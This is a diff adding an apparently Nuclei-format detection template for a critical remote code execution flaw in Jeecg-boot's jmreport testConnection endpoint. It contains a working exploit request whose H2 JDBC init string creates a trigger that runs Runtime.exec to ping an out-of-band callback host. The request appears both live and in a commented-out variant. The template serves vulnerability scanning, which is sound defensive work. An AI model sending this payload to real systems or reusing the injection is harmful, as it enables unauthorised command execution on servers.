@@ -1,0 +1,65 @@
+id: jeecg-boot-jmreport-testConnection-H2-rce
+
+info:
+  name: Jeecg boot - Template Injection
+  author: Co5mos
+  severity: critical
+  tags: ssti,rce,oast,jeecg
+
+http:
+  # - raw:
+  #     - |
+  #       POST /jeecg-boot/jmreport/testConnection HTTP/1.1
+  #       Host: {{Hostname}}
+  #       Accept: application/json, text/plain, */*
+  #       Content-Type: application/json;charset=UTF-8
+  #       Accept-Encoding: gzip, deflate
+  #       Accept-Language: zh-CN,zh;q=0.9
+  #       Connection: close
+
+  #       {
+  #         "id": "1",
+  #         "code": "dataSource1",
+  #         "dbType": "H2",
+  #         "dbDriver": "org.h2.Driver",
+  #         "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('ping {{interactsh-url}}')\u000A$$",
+  #         "dbName": "test",
+  #         "dbUsername": "sa",
+  #         "dbPassword": "",
+  #         "connectTimes": 5
+  #       }
+
+  #   matchers-condition: and
+  #   matchers:
+  #     - type: word
+  #       part: interactsh_protocol # Confirms the HTTP Interaction
+  #       words:
+  #         - http
+  - raw:
+      - |
+        POST /jmreport/testConnection HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json;charset=UTF-8
+        Accept-Encoding: gzip, deflate
+        Accept-Language: zh-CN,zh;q=0.9
+        Connection: close
+
+        {
+          "id": "1",
+          "code": "dataSource1",
+          "dbType": "H2",
+          "dbDriver": "org.h2.Driver",
+          "dbUrl": "jdbc:h2:mem:test;init=CREATE TRIGGER shell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\u000A\u0009java.lang.Runtime.getRuntime().exec('ping {{interactsh-url}}')\u000A$$",
+          "dbName": "test",
+          "dbUsername": "sa",
+          "dbPassword": "",
+          "connectTimes": 5
+        }
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: interactsh_protocol # Confirms the HTTP Interaction
+        words:
+          - http
